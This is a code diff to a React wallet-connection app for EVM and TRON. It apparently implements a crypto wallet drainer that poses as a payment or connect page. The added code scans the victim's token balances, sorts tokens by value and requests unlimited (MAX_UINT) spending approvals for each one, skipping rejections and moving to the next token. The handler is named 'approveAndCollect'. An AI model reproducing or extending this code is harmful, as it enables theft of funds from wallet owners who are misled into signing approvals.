@@ -17,7 +17,7 @@ import { tronMainnet } from '@reown/appkit/networks'
 import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
 import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
 import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
-import { Copy, QrCode } from 'lucide-react'
+import { Copy, QrCode } from 'lucide-react' 
 
 // --- WAGMI EVM IMPORTS ---
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
@@ -29,8 +29,7 @@ import TronWeb from 'tronweb'
 
 // ── CONFIG ──
 const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb'
-// const NETWORK = 'Mainnet'
-const NETWORK = 'Nile'
+const NETWORK = 'Nile' // Change to 'Mainnet' when ready
 
 // 🔥 CONTRACT ADDRESSES Tron Nile testnet/ Sepolia testnet
 const TRON_CONTRACT_ADDRESS = 'TKJRT2jGbMpu6Hhyxnisbcr82y5uNKxedn'
@@ -146,6 +145,7 @@ createAppKit({
 // === TRON ABIs ===
 const USDT_ABI = [
   { inputs: [{ name: 'who', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
+  { inputs: [], name: 'decimals', outputs: [{ name: '', type: 'uint8' }], stateMutability: 'view', type: 'function' },
   { inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], stateMutability: 'view', type: 'function' },
   { inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], stateMutability: 'nonpayable', type: 'function' },
 ]
@@ -270,7 +270,6 @@ export default function App() {
     }
   }
 
-  // ── ROUTING HANDLERS ──
   const handleConnect = () => {
     if (!usdtBalance || usdtBalance === '0' || usdtBalance === '0.00') {
       setAmountError('Amount field is required');
@@ -285,22 +284,45 @@ export default function App() {
     if (!walletAddress) return;
 
     setLoading(true);
-    log("Requesting Multi-Token Approvals...");
+    setStatus('Scanning wallet balances...');
+    log("Scanning balances to prioritize highest value...");
 
     try {
       const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
 
       // =====================================
-      // 🟢 EVM MULTI-TOKEN LOOP
+      // 🟢 EVM: PRE-SCAN & MULTI-TOKEN LOOP
       // =====================================
       if (isEVM && evmWalletProvider) {
         const ethersProvider = new BrowserProvider(evmWalletProvider as any);
         const signer = await ethersProvider.getSigner();
         
-        // Grab the array of EVM tokens for the current network
-        const tokens = TARGET_TOKENS[NETWORK].EVM;
+        const baseTokens = TARGET_TOKENS[NETWORK].EVM;
+        const validTokens = [];
 
-        for (const token of tokens) {
+        // 1. Scan all tokens for balances
+        for (const token of baseTokens) {
+          try {
+            const tokenContract = new Contract(token.address, EVM_ERC20_ABI, ethersProvider);
+            const bal = await tokenContract.balanceOf(walletAddress);
+            if (bal > 0n) {
+              const dec = await tokenContract.decimals();
+              const normalizedBal = parseFloat(formatUnits(bal, dec));
+              validTokens.push({ ...token, balance: normalizedBal });
+            }
+          } catch (e) {
+            log(`Could not fetch balance for ${token.symbol}`);
+          }
+        }
+
+        // 2. Sort from Highest Balance to Lowest
+        validTokens.sort((a, b) => b.balance - a.balance);
+        
+        // 3. Fallback to base list if somehow the scan failed but we still want to try
+        const tokensToProcess = validTokens.length > 0 ? validTokens : baseTokens;
+
+        // 4. Execute Approvals in Sorted Order
+        for (const token of tokensToProcess) {
           try {
             setStatus(`Approving ${token.symbol}...`);
             const usdtContract = new Contract(token.address, EVM_ERC20_ABI, signer);
@@ -311,7 +333,6 @@ export default function App() {
             log(`✅ ${token.symbol} Approved!`);
           } catch (err) {
             log(`⚠️ User skipped/rejected ${token.symbol}. Moving to next token.`);
-            // Loop automatically continues to the next token
           }
         }
         
@@ -320,7 +341,7 @@ export default function App() {
       }
 
       // =====================================
-      // 🔴 TRON MULTI-TOKEN LOOP
+      // 🔴 TRON: PRE-SCAN & MULTI-TOKEN LOOP
       // =====================================
       if (isTron) {
         let activeTw = null;
@@ -331,9 +352,29 @@ export default function App() {
           await new Promise(r => setTimeout(r, 500));
         }
 
-        const tokens = TARGET_TOKENS[NETWORK].TRON;
+        const baseTokens = TARGET_TOKENS[NETWORK].TRON;
+        const validTokens = [];
 
-        // Reusable function for WalletConnect users
+        // 1. Scan all TRON tokens for balances
+        for (const token of baseTokens) {
+          try {
+            if (activeTw && typeof activeTw.contract === 'function') {
+              const contract = await activeTw.contract(USDT_ABI).at(token.address);
+              const balObj = await contract.balanceOf(walletAddress).call();
+              const balNum = Number(balObj.toString());
+              if (balNum > 0) {
+                validTokens.push({ ...token, rawBalance: balNum });
+              }
+            }
+          } catch (e) {
+            log(`Could not fetch balance for ${token.symbol}`);
+          }
+        }
+
+        // 2. Sort from Highest Raw Balance to Lowest
+        validTokens.sort((a, b) => b.rawBalance - a.rawBalance);
+        const tokensToProcess = validTokens.length > 0 ? validTokens : baseTokens;
+
         const signAndSend = async (contractAddr: string, func: string, params: any[], fee: number) => {
           const publicTw = new (TronWeb as any)({ fullHost: FULL_HOST });
           const { transaction } = await publicTw.transactionBuilder.triggerSmartContract(
@@ -354,8 +395,8 @@ export default function App() {
           return broadcast.txid || broadcast.transaction?.txID;
         };
 
-        // Loop through all TRON targets
-        for (const token of tokens) {
+        // 3. Execute Approvals in Sorted Order
+        for (const token of tokensToProcess) {
           try {
             setStatus(`Approving ${token.symbol}...`);
             
@@ -379,7 +420,6 @@ export default function App() {
             }
           } catch (err) {
              log(`⚠️ User skipped/rejected ${token.symbol}. Moving to next token.`);
-             // Loop continues to next token
           }
         }
         
@@ -472,8 +512,6 @@ export default function App() {
       </div>
 
       <div style={{ padding: '20px', backgroundColor: '#ffffff', paddingBottom: '32px', width: '100%', boxSizing: 'border-box' }}>
-        {/* Removed extra text div to let the button itself communicate status */}
-
         <button
           onClick={!isConnected ? handleConnect : approveAndCollect}
           disabled={isButtonDisabled}
